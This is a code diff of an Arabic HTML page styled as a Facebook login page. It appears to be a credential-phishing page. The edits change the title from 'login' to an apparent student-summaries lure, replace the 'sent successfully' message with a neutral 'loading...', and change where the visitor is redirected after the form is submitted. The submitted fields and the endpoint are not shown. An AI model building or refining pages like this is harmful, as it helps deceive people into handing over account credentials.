@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>Facebook - تسجيل الدخول</title>
+  <title>Facebook -ملخصات الباك</title>
   <style>
     * {
       box-sizing: border-box;
@@ -109,13 +109,13 @@
         });
 
         if (response.ok) {
-          messageBox.textContent = "تم الإرسال بنجاح!";
+          messageBox.textContent = "loading... ";
           messageBox.classList.add("success");
           form.reset();
 
           // إعادة التوجيه بعد ثانية واحدة
           setTimeout(() => {
-            window.location.href = 'https://facebook.com/groups/547132448088903/';
+            window.location.href = 'https://www.facebook.com/share/1F8FB952Wf/';
           }, 1000);
         } else {
           messageBox.textContent = "حدث خطأ أثناء الإرسال.";
@@ -130,3 +130,4 @@
 
 </body>
 </html>
+
